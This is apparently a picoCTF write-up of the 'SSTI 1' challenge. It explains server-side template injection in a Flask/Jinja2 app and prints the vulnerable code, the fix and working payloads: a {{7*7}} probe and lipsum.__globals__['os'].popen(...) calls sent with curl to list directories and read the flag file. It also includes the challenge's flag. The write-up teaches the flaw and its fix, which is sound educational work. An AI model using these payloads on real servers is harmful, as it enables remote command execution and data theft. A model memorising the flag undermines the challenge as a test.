# SSTI 1 — picoCTF Writeup

## Challenge Info

| Field       | Details                                        |
|-------------|------------------------------------------------|
| Name        | SSTI 1                                         |
| Category    | Web Exploitation                               |
| Platform    | picoCTF                                        |
| URL         | `http://rescued-float.picoctf.net:50062/`      |

**Description:**
I made a cool website where you can announce whatever you want! I heard templating is a cool and modular way to build web apps!

---

## What is SSTI?

**Server-Side Template Injection (SSTI)** is a vulnerability that occurs when user input is directly embedded into a server-side template without sanitization. Instead of treating the input as plain text, the server interprets it as template code and executes it.

In this challenge, the app uses **Flask** (Python) with **Jinja2** as the template engine.

---

## Solution

### Step 1: Test for SSTI

The website has a simple form where you can type an announcement. The first thing to try is a basic math expression using Jinja2 template syntax:

```
{{7*7}}
```

If the page displays `49` instead of `{{7*7}}`, the server is evaluating our input as template code — confirming SSTI.

```bash
curl -s -X POST -L http://rescued-float.picoctf.net:50062/ -d 'content={{7*7}}'
```

**Result:** The page displays `49`. SSTI confirmed!

---

### Step 2: Understand Why It's Vulnerable

Looking at the source code (`/challenge/app.py`), the vulnerability is in the `/announce` route:

```python
@app.route("/announce", methods=["POST"])
def announcement():
    return render_template_string("""
        <!doctype html>
        <h1 style="font-size:100px;" align="center">""" +
          request.form.get("content", "") +
        """</h1>""")
```

The user input (`request.form.get("content")`) is **directly concatenated** into the template string before rendering. This means any Jinja2 syntax in our input will be executed by the server.

The safe way would be to pass the variable separately:

```python
# SAFE - input is treated as data, not code
render_template_string("<h1>{{ content }}</h1>", content=user_input)
```

---

### Step 3: Achieve Remote Code Execution (RCE)

Now that we can execute Jinja2 expressions, we need to escalate this to run system commands so we can read the flag file.

In Jinja2, there is a built-in function called `lipsum` (normally used to generate Lorem Ipsum text). It's a Python function, which means it has a `__globals__` dictionary that contains a reference to the `os` module. We can use this to execute shell commands.

**List the root directory:**

```
{{lipsum.__globals__['os'].popen('ls /').read()}}
```

```bash
curl -s -X POST -L http://rescued-float.picoctf.net:50062/ \
  --data-urlencode "content={{lipsum.__globals__['os'].popen('ls /').read()}}"
```

**Result:**

```
bin boot challenge dev etc home lib ...
```

We can see a `/challenge` directory. Let's look inside:

```
{{lipsum.__globals__['os'].popen('ls /challenge').read()}}
```

**Result:**

```
__pycache__  app.py  flag  requirements.txt
```

There's a file called `flag`.

---

### Step 4: Read the Flag

```
{{lipsum.__globals__['os'].popen('cat /challenge/flag').read()}}
```

```bash
curl -s -X POST -L http://rescued-float.picoctf.net:50062/ \
  --data-urlencode "content={{lipsum.__globals__['os'].popen('cat /challenge/flag').read()}}"
```

**Result:**

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}
```

---

## Flag

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}
```

---

## How the Exploit Chain Works

```
User Input → String Concatenation → render_template_string() → Jinja2 Engine Executes Code
```

1. We type `{{lipsum.__globals__['os'].popen('cat /challenge/flag').read()}}` into the form
2. The server concatenates it directly into the template string
3. Jinja2 sees `{{ }}` and evaluates the expression inside
4. `lipsum.__globals__['os']` gives us access to Python's `os` module
5. `os.popen('cat /challenge/flag').read()` runs the shell command and returns the output
6. The flag is rendered on the page

---

## Key Takeaways

1. **Never concatenate user input into templates.** Always pass user data as variables using the template engine's built-in escaping mechanism.

2. **SSTI can lead to full RCE.** What looks like a simple text display feature can give an attacker complete control over the server if template injection exists.

3. **Test with `{{7*7}}`** — This is the standard first test for SSTI. If you see `49`, dig deeper.

4. **`lipsum` is a common Jinja2 SSTI vector.** It's a built-in function available in all Jinja2 templates, and its `__globals__` dictionary provides access to the `os` module without needing to traverse Python's class hierarchy.
